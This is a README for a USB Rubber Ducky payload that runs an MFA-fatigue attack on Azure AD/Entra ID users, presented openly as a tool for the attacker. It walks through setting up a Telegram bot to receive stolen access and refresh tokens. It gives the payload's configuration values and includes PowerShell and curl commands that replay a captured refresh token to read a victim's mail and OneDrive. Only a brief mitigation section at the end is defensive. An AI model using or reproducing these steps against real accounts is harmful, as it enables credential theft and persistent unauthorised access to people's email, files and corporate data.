# MFA Fatigue + Token Replay

## Description

When plugged into an unlocked Windows machine joined to Azure AD/Entra ID, this payload:

1. **MFA Fatigue Spam** — Uses the OAuth2 device authorization grant flow to repeatedly generate Azure AD sign-in approval requests. Each iteration triggers a sign-in prompt visible on the target's Microsoft Authenticator app and registered devices. The user gets bombarded with approval requests until they accept one out of exhaustion.

2. **Token Capture** — When the user finally accepts, the payload captures the full token response including `access_token`, `refresh_token`, and `id_token`.

3. **Exfiltration** — All captured tokens are exfiltrated to your Telegram bot in real-time. The `refresh_token` can be replayed from any machine to generate new access tokens indefinitely (until revocation).

## How It Works

The device code flow (`/oauth2/v2.0/devicecode`) is designed for devices without browsers, but it has a useful side-effect: each request creates a pending authentication session that the target can approve via their Microsoft Authenticator app by entering the displayed code at `https://microsoft.com/devicelogin`.

By rapidly requesting new device codes in a loop (up to `#MAX_ATTEMPTS` times), the target receives multiple sign-in prompts. The attack relies on the psychological principle of **MFA fatigue** — the user eventually approves one to stop the notification spam.

## Requirements

- **Hardware**: USB Rubber Ducky (or any Hak5 device running DuckyScript 3.0)
- **Target**: Windows 10/11 machine logged into Azure AD / Entra ID
- **Attacker**: Telegram bot to receive exfiltrated tokens

## Setup

### 1. Create a Telegram Bot

1. Open Telegram and search for `@BotFather`
2. Send `/newbot` and follow the prompts
3. Copy the bot token (looks like `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)
4. Start a chat with your new bot and send `/start`
5. Get your Chat ID by sending a message to `@userinfobot` or visiting `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`

### 2. Configure the Payload

Edit these `DEFINE` values at the top of `payload.txt`:

| DEFINE | Description | Example |
|--------|-------------|---------|
| `#TELEGRAM_BOT` | Your Telegram bot token | `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz` |
| `#TELEGRAM_CHAT` | Your Telegram user/chat ID | `987654321` |
| `#TENANT` | Azure AD tenant ID or `common` | `common` or `contoso.onmicrosoft.com` |
| `#MAX_ATTEMPTS` | Max device code iterations (fatigue level) | `50` |

### 3. Compile

Compile with **PayloadStudio** (https://payloadstudio.hak5.org):
- Open `payload.txt`
- Select your keyboard layout
- Compile to `inject.bin`
- Copy to your USB Rubber Ducky SD card

## Token Replay

Once the `refresh_token` is captured, you can replay it from any machine:

```powershell
# PowerShell - Generate new access tokens
$body = @{
    grant_type    = "refresh_token"
    client_id     = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
    refresh_token = "<captured_refresh_token>"
    scope         = "https://graph.microsoft.com/.default"
}
$tok = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Method Post -Body $body
$tok.access_token  # Use this to call Graph API
```

```bash
# cURL - Access Microsoft Graph
curl -H "Authorization: Bearer $ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me
curl -H "Authorization: Bearer $ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me/messages
curl -H "Authorization: Bearer $ACCESS_TOKEN" https://graph.microsoft.com/v1.0/me/drive/root/children
```

## What the Attacker Receives

Telegram message on acceptance:
```
TOKEN_CAPTURED | access_token: eyJ0eXAiOi... | refresh_token: 0.ARwA6j... | id_token: eyJ0e...
Token claims: scope=openid profile email offline_access https://graph.microsoft.com/... token_type=Bearer expires_in=3600
```

## Notes

- The `access_token` expires in ~1 hour (configurable by tenant policy)
- The `refresh_token` is valid for ~90 days or until revoked
- Using client_id `04b07795-8ddb-461a-bbee-02f9e1bf7b46` (Azure CLI) — a well-known public client
- Each device code expires per the `expires_in` field (usually 900s = 15 min)
- Polling interval is determined by the server (usually 5s)
- Tokens can access Microsoft Graph, Outlook, SharePoint, Teams, OneDrive, and other Microsoft 365 services

## Mitigation

- **Number matching** in Microsoft Authenticator prevents simple fatigue (user must type a number shown on screen)
- **Conditional Access** policies enforcing geographic or device compliance can limit token replay
- **Token Protection** (proof-of-possession) binds tokens to specific devices
